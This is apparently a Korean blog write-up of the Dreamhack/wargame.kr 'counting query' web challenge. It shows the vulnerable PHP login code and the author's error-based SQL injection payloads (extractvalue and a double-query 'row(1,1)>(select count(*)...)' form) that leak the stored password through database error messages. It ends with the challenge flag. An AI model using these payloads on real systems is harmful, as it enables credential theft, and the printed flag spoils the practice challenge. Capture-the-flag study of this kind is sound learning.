---
title : "Dreamhack - counting query (wargame.kr, 풀이 봄)"
date: 2022-03-31 20:06 +0900
categories: [Dreamhack, Webhacking]
tags: [Error Based SQL Injection, wargame.kr]
---

## counting query
<hr style="border-top: 1px solid;"><br>

```php
?php
 if (isset($_GET['view-source'])) {
     show_source(__FILE__);
     exit();
 }
 include("./inc.php"); // database connect, $FLAG.
 ini_set('display_errors',false);

 function err($str){ die("<script>alert(\"$str\");window.location.href='./';</script>"); }
 function uniq($data){ return md5($data.uniqid());}
 function make_id($id){ return mysql_query("insert into all_user_accounts values (null,'$id','".uniq($id)."','guest@nothing.null',2)");}
 function counting($id){ return mysql_query("insert into login_count values (null,'$id','".time()."')");}
 function pw_change($id) { return mysql_query("update all_user_accounts set ps='".uniq($id)."' where user_id='$id'"); }
 function count_init($id) { return mysql_query("delete from login_count where id='$id'"); }
 function t_table($id) { return mysql_query("create temporary table t_user as select * from all_user_accounts where user_id='$id'"); };

 if(empty($_POST['id']) || empty($_POST['pw']) || empty($_POST['type'])){
  err("Parameter Error :: missing");
 }

 $id=mysql_real_escape_string($_POST['id']);
 $ps=mysql_real_escape_string($_POST['pw']);
 $type=mysql_real_escape_string($_POST['type']);
 $ip=$_SERVER['REMOTE_ADDR'];

 sleep(2); // not Bruteforcing!!

 if($id!=$ip){
  err("SECURITY : u can access with allotted id only");
 }

 $row=mysql_fetch_array(mysql_query("select 1 from all_user_accounts where user_id='$id'"));
 if($row[0]!=1){
  if(false === make_id($id)){
   err("DB Error :: create user error");
  }
 }
 
 $row=mysql_fetch_array(mysql_query("select count(*) from login_count where id='$id'"));
 $log_count = (int)$row[0];
 if($log_count >= 4){
  pw_change($id);
  count_init($id);
  err("SECURITY : bruteforcing detected - password is changed");
 }
 
 t_table($id); // don`t access the other account

 if(preg_match("/all_user_accounts/i",$type)){
  err("SECURITY : don`t access the other account");
 }

 counting($id); // limiting number of query

 if(false === $result=mysql_query("select * from t_user where user_id='$id' and ps='$ps' and type=$type")){
  err("DB Error :: ".mysql_error());
 }

 $row=mysql_fetch_array($result);
 
 if(empty($row['user_id'])){
  err("Login Error :: not found your `user_id` or `password`");
 }

 echo "welcome <b>$id</b> !! (Login count = $log_count)";
 
 $row=mysql_fetch_array(mysql_query("select ps from t_user where user_id='$id' and ps='$ps'"));

 //patched 04.22.2015
 if (empty($ps)) err("DB Error :: data not found..");

 if($row['ps']==$ps){ echo "<h2>wow! FLAG is : ".$FLAG."</h2>"; }

?>
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

```if(false === $result=mysql_query("select * from t_user where user_id='$id' and ps='$ps' and type=$type")) { err("DB Error :: ".mysql_error()); }``` 

이 부분을 이용하여 alert 메시지를 확인해가면서 풀 수 있을 듯 하다.

<br>

우선 개발자 도구에서 타입을 선택하는 부분이다.
: ```<select name='type'> <option value='1'>admin</option> <option value='2' selected>user</option> </select>```

여기서 admin 부분을 보면 value가 1로 설정되어 있다. 

이 값을 아래와 같이 변경해주면 버전을 확인할 수 있다.

<br>

1 union select extractvalue(1, concat(0x3a,version()))
: ```DB Error :: XPATH syntax error: ':5.5.64-MariaDB-1ubuntu0.14.04.1'```

<br>

우리는 비밀번호를 찾아야 한다. 그 비밀번호는 우리가 에러를 일으키면서 출력된 에러 안에 표시가 되어야 한다.

<br>

extractvalue로는 Constant XPATH 에러가 계속 떠서 xml 함수로는 불가능하다고 판단, ```select COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) as x FROM information_schema.tables GROUP BY x``` 이 구문을 이용해보려 했는데 이 구문은 제대로 이해를 하지 못해서 풀이를 찾아보았다..

<br>

Double Query Injection
: <a href="https://medium.com/cybersecurityservices/sql-injection-double-query-injection-sudharshan-kumar-8222baad1a9c" target="_blank">medium.com/cybersecurityservices/sql-injection-double-query-injection-sudharshan-kumar-8222baad1a9c</a>

<br>

```or row(1,1)>(select count(*), concat(ps,0x3a,floor(rand()*2)) as a from information_schema.tables group by a)```

-> ```DB Error :: Duplicate entry '98cb680f6259df442c7878192ab5d58a:0' for key 'group_key'```

<br>

row 함수의 의미
: <a href="https://ch4njun.tistory.com/88" target="_blank">ch4njun.tistory.com/88</a>
: <a href="https://ind2x.github.io/posts/sql_injection/#error-based-sql-injection" target="_blank">ind2x.github.io/posts/sql_injection/#error-based-sql-injection</a>

<br>

+ Flag : ```DH{7e4950ce11ea958764a20eadb3bf43c6b49b474f}```

<br><br>
<hr style="border: 2px solid;">
<br><br>

